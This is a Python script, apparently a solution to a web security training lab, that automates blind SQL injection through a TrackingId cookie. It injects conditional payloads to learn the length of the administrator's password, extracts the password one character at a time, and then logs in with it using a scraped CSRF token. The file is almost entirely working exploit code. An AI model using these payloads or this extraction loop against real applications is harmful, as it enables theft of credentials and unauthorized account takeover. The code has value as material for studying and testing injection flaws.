import urllib3
import sys
import requests
from bs4 import BeautifulSoup
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1:8082', 'https':'http://127.0.0.1:8082'}

def getCSRF(r):
    soup = BeautifulSoup(r.text,'html.parser')
    csrf = soup.find('input')['value']
    return csrf

def login(username, password, url):
    uri = '/login'
    fullurl = url + uri
    s = requests.Session()
    r = s.get(fullurl, verify=False, proxies=proxies)
    csrf = getCSRF(r)
    data = {
        'csrf': csrf,
        'username': username,
        'password': password
    }
    t = s.post(fullurl, verify=False, proxies=proxies, data=data)
    if 'Log out' in t.text:
        print('\n Login Bypassed')

    else :
        print('\n Log In bypassed failed')

def blindsqliexploit(url):
    uri = "/"
    fullurl = url + uri
    for i in range (1,50):
     payload = "' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>{0})='a".format(i)

     cookie = {
         'TrackingId':"X7S6wAC18zFGzqqz"+ payload,
         'session':"GTnv2Vw6cQOShaQ7dYiVEgKZgZSd2G05"
         }

     r = requests.get(fullurl, verify=False, proxies=proxies, cookies=cookie)
     if 'Welcome back' not in r.text:
         print('The length of password is' ,i)
         passwordlength = i
         break

    password = ""
    for j in range(1,passwordlength+1):
        username = 'administrator'
        for k in range(32,126):
            payload1 = "' and (select substring(password,{0},1) from users where username='administrator')='{1}'--" .format(j,chr(k))
            cookie1 = {
           'TrackingId':"X7S6wAC18zFGzqqz"+ payload1,
           'session':"GTnv2Vw6cQOShaQ7dYiVEgKZgZSd2G05"
           }
            t = requests.get(fullurl, verify=False, proxies=proxies, cookies=cookie1)
            if 'Welcome back!' in t.text:
              password = password + str(chr(k))
              sys.stdout.write('\r' + password)
              sys.stdout.flush()
              break
            else:
                sys.stdout.write('\r' + password + str(chr(k)))
                sys.stdout.flush()
    #print(password)
    login(username, password, url)


if __name__ == '__main__':
    try:
        url = sys.argv[1].strip()

    except IndexError:
        print("[-] Usage python3 blindsqlinjectionwithconditionalresponses.py <url>")
        print("[-] Example python3 blindsqlinjectionwithconditionalresponses.py https://example.com")

    blindsqliexploit(url)
